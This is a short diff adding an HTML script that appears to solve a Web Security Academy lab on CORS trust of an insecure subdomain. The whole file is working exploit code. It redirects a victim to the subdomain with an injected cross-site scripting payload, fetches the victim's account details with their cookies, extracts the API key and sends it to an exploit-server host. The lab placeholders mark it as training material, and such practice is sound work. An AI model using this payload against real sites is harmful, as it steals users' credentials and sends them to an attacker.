@@ -1,0 +1,16 @@
+<script>
+    const subdomain_url = "http://stock.LAB-ID.web-security-academy.net";
+
+    const script = (`<script>
+        (async () => {
+            const vulnerable_url = "https://LAB-ID.web-security-academy.net/accountDetails";
+            const malicious_url = "https://exploit-EXPLOIT-LAB-ID.exploit-server.net";
+
+            const response = await fetch(vulnerable_url, {credentials: "include"});
+            const { apikey } = await response.json();
+
+            fetch(malicious_url + "/log?data=" + apikey);
+    })();`).replace(/(\r\n|\n|\r|\t)|(^\s*|\s*$)/gm, "") + "</" + "script>";
+    
+    document.location = `${subdomain_url}/?productId=1${encodeURIComponent(script)}&storeId=1`;
+</script>
